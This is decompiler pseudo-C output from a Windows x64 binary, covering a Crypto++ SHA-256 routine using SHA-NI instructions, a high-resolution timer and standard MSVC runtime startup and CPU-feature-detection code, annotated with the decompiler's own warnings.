// 13F1894B0: using guessed type __int128 xmmword_13F1894B0;
// 13F1894C0: using guessed type __int128 xmmword_13F1894C0;

//----- (000000013F13FBF0) ----------------------------------------------------
void __fastcall sub_13F13FBF0(__m128i *a1, const __m128i *a2, unsigned __int64 a3, int a4)
{
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i si128; // xmm12
  __m128i v7; // xmm0
  __m128i v8; // xmm11
  __m128i v10; // xmm11
  const __m128i *v11; // rdx
  unsigned __int64 v12; // r8
  __m128i v14; // xmm9
  __m128i v87; // xmm1
  __m128i v88; // xmm2

  v4 = _mm_loadu_si128(a1);
  v5 = _mm_loadu_si128(a1 + 1);
  if ( a4 == 1 )
    si128 = _mm_load_si128((const __m128i *)&xmmword_13F187A60);
  else
    si128 = _mm_load_si128((const __m128i *)&xmmword_13F1894D0);
  v7 = _mm_shuffle_epi32(v4, 177);
  v8 = _mm_shuffle_epi32(v5, 27);
  _XMM10 = _mm_alignr_epi8(v7, v8, 8);
  v10 = _mm_blend_epi16(v8, v7, 240);
  if ( a3 >= 0x40 )
  {
    v11 = a2 + 2;
    v12 = a3 >> 6;
    do
    {
      _XMM2 = _mm_shuffle_epi8(_mm_loadu_si128(v11 - 1), si128);
      v14 = _XMM10;
      _XMM3 = _mm_shuffle_epi8(_mm_loadu_si128(v11), si128);
      _XMM4 = _mm_shuffle_epi8(_mm_loadu_si128(v11 + 1), si128);
      _XMM1 = _mm_shuffle_epi8(_mm_loadu_si128(v11 - 2), si128);
      _XMM8 = v10;
      __asm
      {
        sha256rnds2 xmm8, xmm10, xmm0
        sha256rnds2 xmm10, xmm8, xmm0
        sha256msg1 xmm1, xmm2
      }
      _XMM5 = _mm_add_epi32(_mm_alignr_epi8(_XMM4, _XMM3, 4), _XMM1);
      __asm
      {
        sha256rnds2 xmm8, xmm10, xmm0
        sha256rnds2 xmm10, xmm8, xmm0
        sha256msg1 xmm2, xmm3
        sha256msg2 xmm5, xmm4
        sha256rnds2 xmm8, xmm10, xmm0
      }
      _XMM6 = _mm_add_epi32(_mm_alignr_epi8(_XMM5, _XMM4, 4), _XMM2);
      __asm
      {
        sha256rnds2 xmm10, xmm8, xmm0
        sha256rnds2 xmm8, xmm10, xmm0
        sha256rnds2 xmm10, xmm8, xmm0
        sha256rnds2 xmm8, xmm10, xmm0
        sha256rnds2 xmm10, xmm8, xmm0
        sha256msg2 xmm6, xmm5
        sha256rnds2 xmm8, xmm10, xmm0
        sha256rnds2 xmm10, xmm8, xmm0
        sha256msg1 xmm3, xmm4
      }
      _XMM2 = _mm_add_epi32(_mm_alignr_epi8(_XMM6, _XMM5, 4), _XMM3);
      __asm
      {
        sha256msg2 xmm2, xmm6
        sha256rnds2 xmm8, xmm10, xmm0
        sha256rnds2 xmm10, xmm8, xmm0
        sha256msg1 xmm4, xmm5
        sha256msg1 xmm5, xmm6
      }
      _XMM3 = _mm_add_epi32(_mm_alignr_epi8(_XMM2, _XMM6, 4), _XMM4);
      __asm
      {
        sha256msg2 xmm3, xmm2
        sha256rnds2 xmm8, xmm10, xmm0
      }
      _XMM7 = _mm_add_epi32(_mm_alignr_epi8(_XMM3, _XMM2, 4), _XMM5);
      __asm
      {
        sha256rnds2 xmm10, xmm8, xmm0
        sha256msg2 xmm7, xmm3
        sha256msg1 xmm6, xmm2
        sha256rnds2 xmm8, xmm10, xmm0
        sha256msg1 xmm2, xmm3
      }
      v11 += 4;
      _XMM1 = _mm_add_epi32(_mm_alignr_epi8(_XMM7, _XMM3, 4), _XMM6);
      __asm
      {
        sha256rnds2 xmm10, xmm8, xmm0
        sha256msg2 xmm1, xmm7
      }
      _XMM4 = _mm_add_epi32(_mm_alignr_epi8(_XMM1, _XMM7, 4), _XMM2);
      __asm
      {
        sha256rnds2 xmm8, xmm10, xmm0
        sha256rnds2 xmm10, xmm8, xmm0
        sha256msg2 xmm4, xmm1
        sha256rnds2 xmm8, xmm10, xmm0
        sha256rnds2 xmm10, xmm8, xmm0
        sha256msg1 xmm3, xmm7
      }
      _XMM5 = _mm_add_epi32(_mm_alignr_epi8(_XMM4, _XMM1, 4), _XMM3);
      __asm
      {
        sha256msg2 xmm5, xmm4
        sha256rnds2 xmm8, xmm10, xmm0
        sha256rnds2 xmm10, xmm8, xmm0
        sha256msg1 xmm7, xmm1
      }
      _XMM3 = _mm_add_epi32(_mm_alignr_epi8(_XMM5, _XMM4, 4), _XMM7);
      __asm
      {
        sha256msg1 xmm1, xmm4
        sha256msg2 xmm3, xmm5
      }
      _XMM2 = _mm_add_epi32(_mm_alignr_epi8(_XMM3, _XMM5, 4), _XMM1);
      __asm
      {
        sha256rnds2 xmm8, xmm10, xmm0
        sha256rnds2 xmm10, xmm8, xmm0
        sha256msg2 xmm2, xmm3
        sha256rnds2 xmm8, xmm10, xmm0
        sha256rnds2 xmm10, xmm8, xmm0
        sha256msg1 xmm4, xmm5
      }
      _XMM1 = _mm_add_epi32(_mm_alignr_epi8(_XMM2, _XMM3, 4), _XMM4);
      __asm
      {
        sha256msg2 xmm1, xmm2
        sha256rnds2 xmm8, xmm10, xmm0
        sha256rnds2 xmm10, xmm8, xmm0
        sha256msg1 xmm5, xmm3
      }
      _XMM0 = _mm_add_epi32(_mm_alignr_epi8(_XMM1, _XMM2, 4), _XMM5);
      __asm
      {
        sha256msg2 xmm0, xmm1
        sha256rnds2 xmm8, xmm10, xmm0
      }
      v10 = _mm_add_epi32(v10, _XMM8);
      __asm { sha256rnds2 xmm10, xmm8, xmm0 }
      _XMM10 = _mm_add_epi32(_XMM10, v14);
      --v12;
    }
    while ( v12 );
  }
  v87 = _mm_shuffle_epi32(_XMM10, 27);
  v88 = _mm_shuffle_epi32(v10, 177);
  *a1 = _mm_blend_epi16(v87, v88, 240);
  a1[1] = _mm_alignr_epi8(v88, v87, 8);
}
// 13F187A60: using guessed type __int128 xmmword_13F187A60;
// 13F1894D0: using guessed type __int128 xmmword_13F1894D0;

//----- (000000013F140020) ----------------------------------------------------
__int64 sub_13F140020()
{
  unsigned int v1; // eax
  __m128i *v2; // rax
  __m128i *v3; // rax
  __int64 v4[2]; // [rsp+20h] [rbp-A8h] BYREF
  __m128i v5[2]; // [rsp+30h] [rbp-98h] BYREF
  __m128i v6[2]; // [rsp+50h] [rbp-78h] BYREF
  char pExceptionObject[64]; // [rsp+70h] [rbp-58h] BYREF

  v4[1] = -2i64;
  v4[0] = 0i64;
  if ( !(unsigned int)MEMORY[0x76F859A0](v4) )
  {
    v1 = MEMORY[0x76F91760]();
    v2 = sub_13F10EA70(v5, v1, 0xAu);
    v3 = sub_13F10EA10(v6, (const __m128i *)"Timer: QueryPerformanceCounter failed with error ", v2);
    sub_13F101560((__int64)pExceptionObject, 6, v3);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVException_CryptoPP__);
  }
  return v4[0];
}
// 13F140020: using guessed type __m128i var_98[2];
// 13F140020: using guessed type __m128i var_78[2];

//----- (000000013F1400D0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F1400D0()
{
  __int64 v1; // [rsp+28h] [rbp-A0h]

  v1 = -2i64;
  if ( *(int *)(*((_QWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + (unsigned int)TlsIndex) + 4i64) < 0 )
    sub_13F14045C(&dword_13F1C56D0);
  return 0i64;
}
// 13F140139: write access to const memory at 13F1C56C8 has been detected
// 13F1400D0: using guessed type __int64 __fastcall sub_13F1400D0();
// 13F1C56C8: using guessed type __int64 qword_13F1C56C8;
// 13F1C56D0: using guessed type int dword_13F1C56D0;
// 13F1C5CF0: using guessed type int TlsIndex;

//----- (000000013F1401D0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1401D0(_QWORD *a1)
{
  a1[2] = 0i64;
  a1[1] = 0x1FFFFFFFFFFFFFFFi64;
  a1[3] = sub_13F132BE0((__int64)a1, 0i64);
  return a1;
}

//----- (000000013F140244) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F140244()
{
  __int64 v0; // rbx
  void (__fastcall *v1)(__int64 *); // rsi
  __int64 v2; // rdi
  __int64 v3; // rax
  __int64 v4; // rbx

  MEMORY[0x76F85980](qword_13F1C56D8, 4000i64);
  v0 = MEMORY[0x76F920C0](L"api-ms-win-core-synch-l1-2-0.dll");
  if ( !v0 )
  {
    v0 = MEMORY[0x76F920C0](L"kernel32.dll");
    if ( !v0 )
    {
LABEL_11:
      sub_13F1411D8(7u);
      JUMPOUT(0x13F1403A1i64);
    }
  }
  v1 = (void (__fastcall *)(__int64 *))MEMORY[0x76F92020](v0, "InitializeConditionVariable");
  v2 = MEMORY[0x76F92020](v0, "SleepConditionVariableCS");
  v3 = MEMORY[0x76F92020](v0, "WakeAllConditionVariable");
  v4 = v3;
  if ( !v1 || !v2 || !v3 )
  {
    qword_13F1C5708 = MEMORY[0x76F84730](0i64, 1i64, 0i64);
LABEL_10:
    sub_13F1411D8(7u);
    goto LABEL_11;
  }
  qword_13F1C5708 = 0i64;
  v1(&qword_13F1C5700);
  qword_13F1C5710 = __ROR8__(v2, 64 - ((unsigned __int8)_security_cookie & 0x3Fu)) ^ _security_cookie;
  qword_13F1C5718 = __ROR8__(v4, 64 - ((unsigned __int8)_security_cookie & 0x3Fu)) ^ _security_cookie;
  if ( !sub_13F140660() )
  {
    sub_13F1411D8(7u);
    goto LABEL_10;
  }
  sub_13F140874((__int64)sub_13F1403A4);
  return 0i64;
}
// 13F1403A0: control flows out of bounds to 13F1403A1
// 13F1402EB: write access to const memory at 13F1C5708 has been detected
// 13F140320: write access to const memory at 13F1C5710 has been detected
// 13F14032D: write access to const memory at 13F1C5718 has been detected
// 13F140372: write access to const memory at 13F1C5708 has been detected
// 13F140244: using guessed type __int64 __fastcall sub_13F140244();
// 13F1403A4: using guessed type __int64 __fastcall sub_13F1403A4();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F181660: using guessed type wchar_t aKernel32Dll[13];
// 13F189C20: using guessed type wchar_t aApiMsWinCoreSy[33];
// 13F1C56D8: using guessed type __int64 qword_13F1C56D8[4];
// 13F1C5700: using guessed type __int64 qword_13F1C5700;
// 13F1C5708: using guessed type __int64 qword_13F1C5708;
// 13F1C5710: using guessed type __int64 qword_13F1C5710;
// 13F1C5718: using guessed type __int64 qword_13F1C5718;

//----- (000000013F1403A4) ----------------------------------------------------
__int64 sub_13F1403A4()
{
  return MEMORY[0x771B38F0](qword_13F1C56D8);
}
// 13F1403A4: using guessed type __int64 __fastcall sub_13F1403A4();
// 13F1C56D8: using guessed type __int64 qword_13F1C56D8[4];

//----- (000000013F1403CC) ----------------------------------------------------
__int64 __fastcall sub_13F1403CC(_DWORD *a1)
{
  MEMORY[0x771DD7F0](qword_13F1C56D8);
  *a1 = 0;
  MEMORY[0x771DD830](qword_13F1C56D8);
  return sub_13F1404C4();
}
// 13F1C56D8: using guessed type __int64 qword_13F1C56D8[4];

//----- (000000013F1403FC) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1403FC(_DWORD *a1)
{
  MEMORY[0x771DD7F0](qword_13F1C56D8);
  dword_13F1B7180 = -2147483642;
  *a1 = -2147483643;
  *(_DWORD *)(*((_QWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + (unsigned int)TlsIndex) + 4i64) = -2147483643;
  MEMORY[0x771DD830](qword_13F1C56D8);
  return sub_13F1404C4();
}
// 13F140427: write access to const memory at 13F1B7180 has been detected
// 13F1B7180: using guessed type int dword_13F1B7180;
// 13F1C56D8: using guessed type __int64 qword_13F1C56D8[4];
// 13F1C5CF0: using guessed type int TlsIndex;

//----- (000000013F14045C) ----------------------------------------------------
void __fastcall sub_13F14045C(_DWORD *a1)
{
  MEMORY[0x771DD7F0](qword_13F1C56D8);
  while ( *a1 )
  {
    if ( *a1 != -1 )
    {
      *(_DWORD *)(*((_QWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + (unsigned int)TlsIndex) + 4i64) = -2147483643;
LABEL_7:
      JUMPOUT(0x771DD830i64);
    }
    sub_13F140514(0x64u);
  }
  *a1 = -1;
  goto LABEL_7;
}
// 13F1404BC: control flows out of bounds to 771DD830
// 13F1B7180: using guessed type int dword_13F1B7180;
// 13F1C56D8: using guessed type __int64 qword_13F1C56D8[4];
// 13F1C5CF0: using guessed type int TlsIndex;

//----- (000000013F1404C4) ----------------------------------------------------
__int64 sub_13F1404C4()
{
  return ((__int64 (__fastcall *)(__int64 *))__ROR8__(_security_cookie ^ 0x1DC697A5EF7154DEi64, _security_cookie & 0x3F))(&qword_13F1C5700);
}
// 13F14050D: control flows out of bounds to 76F7CE50
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5700: using guessed type __int64 qword_13F1C5700;

//----- (000000013F140514) ----------------------------------------------------
__int64 __fastcall sub_13F140514(unsigned int a1)
{
  return ((__int64 (__fastcall *)(__int64 *, __int64 *, _QWORD))__ROR8__(
                                                                  _security_cookie ^ 0x1DBEC171EF7154DEi64,
                                                                  _security_cookie & 0x3F))(
           &qword_13F1C5700,
           qword_13F1C56D8,
           a1);
}
// 13F140584: control flows out of bounds to 771DD7F0
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C56D8: using guessed type __int64 qword_13F1C56D8[4];
// 13F1C5700: using guessed type __int64 qword_13F1C5700;

//----- (000000013F14058C) ----------------------------------------------------
void sub_13F14058C()
{
  JUMPOUT(0x77202BF0i64);
}
// 13F140593: control flows out of bounds to 77202BF0

//----- (000000013F14059C) ----------------------------------------------------
__int64 __fastcall sub_13F14059C(__int64 a1)
{
  __int64 i; // rbx
  __int64 result; // rax

  for ( i = a1; ; a1 = i )
  {
    result = sub_13F16A298(a1);
    if ( result )
      break;
    if ( !sub_13F16C1D0(i) )
    {
      if ( i != -1 )
        sub_13F141428();
      sub_13F141448();
    }
  }
  return result;
}
// 13F16A298: using guessed type __int64 __fastcall sub_13F16A298(_QWORD);

//----- (000000013F1405D8) ----------------------------------------------------
char sub_13F1405D8()
{
  PVOID StackBase; // rcx
  signed __int64 v1; // rax

  if ( (unsigned int)sub_13F141468() )
  {
    StackBase = NtCurrentTeb()->NtTib.StackBase;
    while ( 1 )
    {
      v1 = _InterlockedCompareExchange64(&qword_13F1C5738, (signed __int64)StackBase, 0i64);
      if ( !v1 )
        break;
      if ( StackBase == (PVOID)v1 )
        return 1;
    }
  }
  return 0;
}
// 13F1C5738: using guessed type __int64 qword_13F1C5738;

//----- (000000013F140614) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char __fastcall sub_13F140614(int a1)
{
  byte_13F1C5740 = a1 == 0;
  sub_13F140FA4();
  if ( !sub_13F15F960() )
    return 0;
  if ( !sub_13F16D0F4() )
  {
    sub_13F15F994(0);
    return 0;
  }
  return 1;
}
// 13F14062B: write access to const memory at 13F1C5740 has been detected
// 13F1C5740: using guessed type char byte_13F1C5740;

//----- (000000013F140660) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F140660()
{
  return 1;
}
// 13F1406E6: write access to const memory at 13F1C5748 has been detected
// 13F140701: write access to const memory at 13F1C5758 has been detected
// 13F14070F: write access to const memory at 13F1C5760 has been detected
// 13F140716: write access to const memory at 13F1C5770 has been detected
// 13F14071E: write access to const memory at 13F1C5741 has been detected
// 13F1C5748: using guessed type __int128 xmmword_13F1C5748;
// 13F1C5758: using guessed type __int64 qword_13F1C5758;
// 13F1C5760: using guessed type __int128 xmmword_13F1C5760;
// 13F1C5770: using guessed type __int64 qword_13F1C5770;

//----- (000000013F140738) ----------------------------------------------------
bool __fastcall sub_13F140738(__int64 a1)
{
  unsigned __int64 v1; // r8
  _DWORD *v2; // rdx
  _DWORD *v3; // r9
  unsigned __int64 v4; // rcx

  if ( MEMORY[0x13F100000] != 23117
    || *(_DWORD *)(MEMORY[0x13F10003C] + 0x13F100000i64) != 17744
    || *(_WORD *)(MEMORY[0x13F10003C] + 0x13F100018i64) != 523 )
  {
    return 0;
  }
  v1 = a1 - 0x13F100000i64;
  v2 = (_DWORD *)(*(unsigned __int16 *)(MEMORY[0x13F10003C] + 0x13F100014i64) + MEMORY[0x13F10003C] + 0x13F100018i64);
  v3 = &v2[10 * *(unsigned __int16 *)(MEMORY[0x13F10003C] + 0x13F100006i64)];
  while ( v2 != v3 )
  {
    v4 = (unsigned int)v2[3];
    if ( v1 >= v4 && v1 < (unsigned int)(v4 + v2[2]) )
      return v2 && v2[9] >= 0;
    v2 += 10;
  }
  v2 = 0i64;
  return v2 && v2[9] >= 0;
}

//----- (000000013F1407D4) ----------------------------------------------------
__int64 __fastcall sub_13F1407D4(char a1)
{
  __int64 result; // rax

  result = sub_13F141468();
  if ( (_DWORD)result )
  {
    if ( !a1 )
      _InterlockedExchange64(&qword_13F1C5738, 0i64);
  }
  return result;
}
// 13F1C5738: using guessed type __int64 qword_13F1C5738;

//----- (000000013F1407F8) ----------------------------------------------------
char __fastcall sub_13F1407F8(char a1)
{
  sub_13F16D108();
  sub_13F15F994(a1);
  return 1;
}
// 13F1C5740: using guessed type char byte_13F1C5740;

//----- (000000013F140824) ----------------------------------------------------
__int64 __fastcall sub_13F140824(__int64 a1)
{
  int v2; // eax
  __int64 v3; // rcx

  if ( __ROR8__(_security_cookie ^ 0xFFFFD33A108EAB21ui64, _security_cookie & 0x3F) == -1i64 )
    v2 = sub_13F16CEEC(a1);
  else
    v2 = sub_13F16CF78((__int64)&xmmword_13F1C5748, a1);
  v3 = 0i64;
  if ( !v2 )
    return a1;
  return v3;
}
// 13F1C5748: using guessed type __int128 xmmword_13F1C5748;

//----- (000000013F140874) ----------------------------------------------------
__int64 __fastcall sub_13F140874(__int64 a1)
{
  return (unsigned int)(sub_13F140824(a1) != 0) - 1;
}

//----- (000000013F140894) ----------------------------------------------------
_QWORD *__fastcall sub_13F140894(_QWORD *a1, char a2)
{
  *a1 = &type_info::`vftable';
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 24i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F189C70: using guessed type void *type_info::`vftable';

//----- (000000013F140B5C) ----------------------------------------------------
__int64 sub_13F140B5C()
{
  __int32 v0; // eax
  __int64 *v1; // rbx
  int v2; // eax
  int v3; // eax
  __int64 result; // rax

  sub_13F16D124(1);
  v0 = sub_13F141520();
  sub_13F16D288(v0);
  v1 = sub_13F16D3F4();
  *(_DWORD *)v1 = sub_13F1024C0();
  if ( !sub_13F140660() )
    goto LABEL_8;
  sub_13F141568();
  sub_13F140874((__int64)sub_13F1415A4);
  v2 = sub_13F1021E0();
  if ( (unsigned int)sub_13F16C650(v2) )
    goto LABEL_8;
  sub_13F14058C();
  if ( (unsigned int)sub_13F14154C() )
    sub_13F16D19C((__int64)sub_13F1024C0);
  v3 = sub_13F1024C0();
  sub_13F16D354(v3);
  if ( sub_13F1021D0() )
    sub_13F16CB2C();
  sub_13F1024C0();
  result = sub_13F141324();
  if ( (_DWORD)result )
  {
LABEL_8:
    sub_13F1411D8(7u);
    JUMPOUT(0x13F140C12i64);
  }
  return result;
}
// 13F140C0D: control flows out of bounds to 13F140C12
// 13F1024B0: using guessed type __int64 __fastcall guard_check_icall_nop();
// 13F140B5C: using guessed type __int64 __fastcall sub_13F140B5C();
// 13F16CB2C: using guessed type __int64 sub_13F16CB2C(void);

//----- (000000013F140C14) ----------------------------------------------------
__int64 sub_13F140C14()
{
  sub_13F141530();
  return 0i64;
}
// 13F140C14: using guessed type __int64 __fastcall sub_13F140C14();

//----- (000000013F140C24) ----------------------------------------------------
__int64 sub_13F140C24()
{
  unsigned __int32 v0; // eax

  sub_13F141380();
  v0 = sub_13F1024C0();
  return sub_13F16D3C8(v0);
}
// 13F140C24: using guessed type __int64 __fastcall sub_13F140C24();

//----- (000000013F140C40) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F140C40()
{
  unsigned int v0; // ebx
  char v1; // bl
  __int64 *v2; // rax
  __int64 *v3; // rbx
  __int64 *v4; // rax
  __int64 *v5; // rbx

  if ( sub_13F140614(1) )
  {
    v1 = sub_13F1405D8();
    sub_13F1407D4(v1);
    v2 = sub_13F141558();
    v3 = v2;
    if ( *v2 && sub_13F140738((__int64)v2) )
      ((void (__fastcall *)(_QWORD, __int64))*v3)(0i64, 2i64);
    v4 = sub_13F141560();
    v5 = v4;
    if ( *v4 )
    {
      if ( sub_13F140738((__int64)v4) )
        sub_13F16A108(*v5);
    }
    sub_13F16D2F8();
    sub_13F16D2F0();
    sub_13F16CB08();
    v0 = sub_13F17B090();
    if ( sub_13F14132C() )
    {
      sub_13F1407F8(1);
      return v0;
    }
  }
  else
  {
    sub_13F1411D8(7u);
    sub_13F1411D8(7u);
  }
  sub_13F16A14C(v0);
  sub_13F16A0FC(v0);
  return sub_13F140DBC();
}
// 13F140C83: write access to const memory at 13F1C5730 has been detected
// 13F140CC1: write access to const memory at 13F1C5730 has been detected
// 13F140D5A: conditional instruction was optimized away because si.1==1
// 13F140DAE: variable 'v0' is possibly undefined
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5730: using guessed type int dword_13F1C5730;

//----- (000000013F140DBC) ----------------------------------------------------
__int64 sub_13F140DBC()
{
  sub_13F141474();
  return sub_13F140C40();
}

//----- (000000013F140ECC) ----------------------------------------------------
__int64 __fastcall sub_13F140ECC(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 i; // rdi
  __int64 result; // rax

  v3 = a3;
  for ( i = a1 + a3 * a2; ; _guard_dispatch_icall_fptr(i) )
  {
    result = v3--;
    if ( !result )
      break;
    i -= a2;
  }
  return result;
}
// 13F17B9D0: using guessed type __int64 __fastcall guard_dispatch_icall_nop();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F140F38) ----------------------------------------------------
__int64 __fastcall sub_13F140F38(__int64 a1, __int64 a2, __int64 a3, __int64 (__fastcall *a4)(__int64))
{
  __int64 i; // rbx
  __int64 result; // rax

  for ( i = 0i64; i != a3; ++i )
  {
    a1 -= a2;
    result = a4(a1);
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F140FA4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F140FA4()
{
  char v5; // r11
  int v6; // er14
  int v7; // ebp
  int v8; // er9
  int v9; // er8
  int v11; // er10
  int v16; // esi
  int v17; // edi
  int v18; // eax
  unsigned __int64 v19; // rax
  __int64 v20; // rcx
  int v21; // er8

  dword_13F1B71A4 = 2;
  _RAX = 0i64;
  dword_13F1B71A0 = 1;
  __asm { cpuid }
  v5 = 0;
  v6 = _RAX;
  v7 = _RCX ^ 0x444D4163 | _RDX ^ 0x69746E65 | _RBX ^ 0x68747541;
  v8 = _RDX ^ 0x49656E69;
  v9 = _RBX ^ 0x756E6547;
  _RAX = 1i64;
  v11 = _RCX ^ 0x6C65746E;
  __asm { cpuid }
  v16 = _RCX;
  v17 = _RAX;
  if ( !(v11 | v8 | v9)
    && ((qword_13F1B71A8 = -1i64, v18 = _RAX & 0xFFF3FF0, v18 == 67264)
     || v18 == 132704
     || v18 == 132720
     || (v19 = (unsigned int)(v18 - 198224), (unsigned int)v19 <= 0x20) && (v20 = 0x100010001i64, _bittest64(&v20, v19))) )
  {
    v21 = 3;
    dword_13F1C5CF4 = 3;
  }
  else
  {
    v21 = 2;
  }
  if ( !v7 && (v17 & 0xFF00F00u) >= 0x601100 )
  {
    v21 |= 4u;
    dword_13F1C5CF4 = v21;
  }
  _RAX = 7i64;
  if ( v6 >= 7 )
  {
    __asm { cpuid }
    v5 = _RBX;
    if ( (_RBX & 0x200) != 0 )
      dword_13F1C5CF4 = v21 | 2;
  }
  if ( (v16 & 0x100000) != 0 )
  {
    dword_13F1B71A0 = 2;
    dword_13F1B71A4 = 6;
    if ( (v16 & 0x8000000) != 0 && (v16 & 0x10000000) != 0 )
    {
      __asm { xgetbv }
      if ( (_RAX & 6) == 6 )
      {
        dword_13F1B71A0 = 3;
        dword_13F1B71A4 = 46;
        if ( (v5 & 0x20) != 0 )
        {
          dword_13F1B71A0 = 5;
          dword_13F1B71A4 = 46;
        }
      }
    }
  }
  return 0i64;
}
// 13F140FB8: write access to const memory at 13F1B71A4 has been detected
// 13F140FC4: write access to const memory at 13F1B71A0 has been detected
// 13F14102F: write access to const memory at 13F1B71A8 has been detected
// 13F141076: write access to const memory at 13F1C5CF4 has been detected
// 13F14109C: write access to const memory at 13F1C5CF4 has been detected
// 13F1410CD: write access to const memory at 13F1C5CF4 has been detected
// 13F1410DA: write access to const memory at 13F1B71A0 has been detected
// 13F1410E4: write access to const memory at 13F1B71A4 has been detected
// 13F14111F: write access to const memory at 13F1B71A0 has been detected
// 13F141129: write access to const memory at 13F1B71A4 has been detected
// 13F141138: write access to const memory at 13F1B71A0 has been detected
// 13F141142: write access to const memory at 13F1B71A4 has been detected
// 13F1B71A0: using guessed type int dword_13F1B71A0;
// 13F1B71A4: using guessed type int dword_13F1B71A4;
// 13F1B71A8: using guessed type __int64 qword_13F1B71A8;
// 13F1C5CF4: using guessed type int dword_13F1C5CF4;

//----- (000000013F141160) ----------------------------------------------------
void **__fastcall sub_13F141160(__int64 a1, __int64 a2, __int64 a3)
{
  void **result; // rax
  __int64 i; // rbx
  void *retaddr; // [rsp+48h] [rbp+0h] BYREF

  result = &retaddr;
  for ( i = 0i64; i != a3; ++i )
  {
    result = (void **)_guard_dispatch_icall_fptr(a1);
    a1 += a2;
  }
  return result;
}
// 13F17B9D0: using guessed type __int64 __fastcall guard_dispatch_icall_nop();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1411D0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void sub_13F1411D0()
{
  dword_13F1C5CF8 = 0;
}
// 13F1411D0: write access to const memory at 13F1C5CF8 has been detected
// 13F1C5CF8: using guessed type int dword_13F1C5CF8;

//----- (000000013F1411D8) ----------------------------------------------------
void __fastcall sub_13F1411D8(unsigned int a1)
{
  __int64 v2; // rbx
  __int64 v3; // rax
  bool v4; // bl
  __int64 v5[2]; // [rsp+40h] [rbp-C0h] BYREF
  int v6[4]; // [rsp+50h] [rbp-B0h] BYREF
  __int64 v7; // [rsp+60h] [rbp-A0h]
  char v8[152]; // [rsp+F0h] [rbp-10h] BYREF
  __int64 *v9; // [rsp+188h] [rbp+88h]
  __int64 v10; // [rsp+1E8h] [rbp+E8h]
  __int64 retaddr; // [rsp+5C8h] [rbp+4C8h]
  __int64 v12; // [rsp+5D0h] [rbp+4D0h] BYREF
  __int64 v13; // [rsp+5D8h] [rbp+4D8h] BYREF
  char v14; // [rsp+5E0h] [rbp+4E0h] BYREF
  char v15; // [rsp+5E8h] [rbp+4E8h] BYREF

  if ( (unsigned int)sub_13F178220(23i64) )
    __fastfail(a1);
  sub_13F1411D0();
  sub_13F15EF70((__int64)v8, 0, 0x4D0ui64);
  MEMORY[0x76FBBB90](v8);
  v2 = v10;
  v3 = MEMORY[0x76FBBAB0](v10, &v13, 0i64);
  if ( v3 )
    MEMORY[0x76FBBA50](0i64, v13, v2, v3, v8, &v15, &v14, 0i64);
  v10 = retaddr;
  v9 = &v12;
  sub_13F15EF70((__int64)v6, 0, 0x98ui64);
  v7 = retaddr;
  v6[0] = 1073741845;
  v6[1] = 1;
  v5[0] = (__int64)v6;
  v4 = (unsigned int)MEMORY[0x76F77910]() == 1;
  v5[1] = (__int64)v8;
  MEMORY[0x76F89020](0i64);
  if ( !(unsigned int)MEMORY[0x7700BAB0](v5) && !v4 )
    sub_13F1411D0();
}
// 13F178220: using guessed type __int64 __fastcall sub_13F178220(_QWORD);

//----- (000000013F14132C) ----------------------------------------------------
bool sub_13F14132C()
{
  __int64 v0; // rax
  __int64 v1; // rcx
  bool result; // al

  v0 = MEMORY[0x76F920C0](0i64);
  result = 0;
  if ( v0 )
  {
    if ( *(_WORD *)v0 == 23117 )
    {
      v1 = v0 + *(int *)(v0 + 60);
      if ( *(_DWORD *)v1 == 17744 && *(_WORD *)(v1 + 24) == 523 && *(_DWORD *)(v1 + 132) > 0xEu && *(_DWORD *)(v1 + 248) )
        return 1;
    }
  }
  return result;
}

//----- (000000013F141380) ----------------------------------------------------
void sub_13F141380()
{
  JUMPOUT(0x76F89020i64);
}
// 13F141387: control flows out of bounds to 76F89020

//----- (000000013F141390) ----------------------------------------------------
__int64 __fastcall sub_13F141390(_QWORD *a1)
{
  __int64 v1; // rax
  int v2; // ecx

  v1 = *a1;
  if ( *(_DWORD *)*a1 == -529697949 && *(_DWORD *)(v1 + 24) == 4 )
  {
    v2 = *(_DWORD *)(v1 + 32);
    if ( (unsigned int)(v2 - 429065504) <= 2 || v2 == 26820608 )
      sub_13F16A158();
  }
  return 0i64;
}

//----- (000000013F1413C8) ----------------------------------------------------
_QWORD *__fastcall sub_13F1413C8(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F189C90;
  return a1;
}
// 13F189C90: using guessed type __int64 (__fastcall *off_13F189C90[2])();

//----- (000000013F141408) ----------------------------------------------------
_QWORD *__fastcall sub_13F141408(_QWORD *a1)
{
  a1[2] = 0i64;
  a1[1] = "bad array new length";
